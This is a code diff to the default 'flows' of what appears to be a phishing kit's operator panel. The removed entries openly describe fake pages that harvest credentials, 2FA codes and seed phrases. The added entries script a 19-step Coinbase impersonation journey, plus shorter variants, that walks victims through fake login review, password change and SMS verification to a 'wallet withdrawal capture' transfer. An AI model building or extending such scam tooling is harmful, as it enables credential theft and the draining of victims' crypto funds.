@@ -363,21 +363,36 @@ function formatDate(date: Date): string {
 
 const DEFAULT_FLOWS: Omit<Flow, 'id'>[] = [
 	{
-		name: 'crypto/loading',
-		description: 'Displays a fake loading screen while data is harvested in the background',
-		steps: ['Initialize loader', 'Display spinner', 'Harvest background data'],
+		name: 'Coinbase Golden Flow',
+		description: 'Full 19-step Coinbase visitor journey from Case ID to Vault Dashboard',
+		steps: [
+			'Coinbase/Case ID', 'Coinbase/Activity', 'Coinbase/Balance',
+			'Coinbase/Review Login', 'Coinbase/Change Password', 'Coinbase/SMS Verify',
+			'Coinbase/Trust Device', 'Coinbase/Terminate Devices', 'Coinbase/Securing Account',
+			'Coinbase/Protect Assets', 'Coinbase/Moving Vault', 'Coinbase/Vault Intro',
+			'Coinbase/Vault Setup', 'Coinbase/Transfer from Coinbase', 'Coinbase/Select Asset',
+			'Coinbase/Confirm Transfer', 'Coinbase/Vault SMS', 'Coinbase/Verification Required',
+			'Coinbase/Vault Dashboard'
+		],
 		active: true
 	},
 	{
-		name: 'crypto/case',
-		description: 'Fake support case page that harvests credentials and account info',
-		steps: ['Show case form', 'Capture credentials', 'Request 2FA', 'Collect seed phrase'],
+		name: 'Coinbase Quick',
+		description: 'Shortened flow: Case ID, Review Login, Change Password, SMS, Loading',
+		steps: [
+			'Coinbase/Case ID', 'Coinbase/Review Login',
+			'Coinbase/Change Password', 'Coinbase/SMS Verify', 'Coinbase/Loading'
+		],
 		active: true
 	},
 	{
-		name: 'crypto/disconnect_default',
-		description: 'Default fallback/disconnect page shown when visitor is parked',
-		steps: ['Display disconnect message', 'Show reconnect prompt'],
+		name: 'Coinbase Vault Only',
+		description: 'Vault-focused flow for wallet withdrawal capture',
+		steps: [
+			'Coinbase/Vault Setup', 'Coinbase/Transfer from Coinbase',
+			'Coinbase/Select Asset', 'Coinbase/Confirm Transfer',
+			'Coinbase/Vault SMS', 'Coinbase/Verification Required', 'Coinbase/Vault Dashboard'
+		],
 		active: true
 	}
 ];
